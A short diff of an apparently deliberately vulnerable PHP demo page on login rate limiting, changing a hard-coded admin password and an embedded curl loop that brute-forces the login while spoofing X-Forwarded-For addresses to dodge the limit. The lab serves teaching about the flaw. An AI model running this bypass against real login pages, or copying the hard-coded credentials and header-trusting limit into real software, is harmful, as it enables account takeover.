@@ -80,7 +80,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } else {
         // Hard-coded "real" credentials for the demo (do not do this either).
         $valid = ($_POST['user'] ?? '') === 'admin'
-              && ($_POST['pass'] ?? '') === 'hunter2';
+              && ($_POST['pass'] ?? '') === 'hunter300';
 
         if ($valid) {
             $message = "LOGIN OK — welcome, admin.";
@@ -182,7 +182,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
        for i in $(seq 1 1000); do
          curl -s -H "X-Forwarded-For: 10.0.0.$i" -X POST \
-              -d "user=admin&pass=guess$i" http://localhost/vunerability/rate-limit.php \
+              -d "user=admin&pass=hunter$i" http://localhost/vunerability/rate-limit.php \
            | grep -o 'LOGIN OK' && break
        done
 
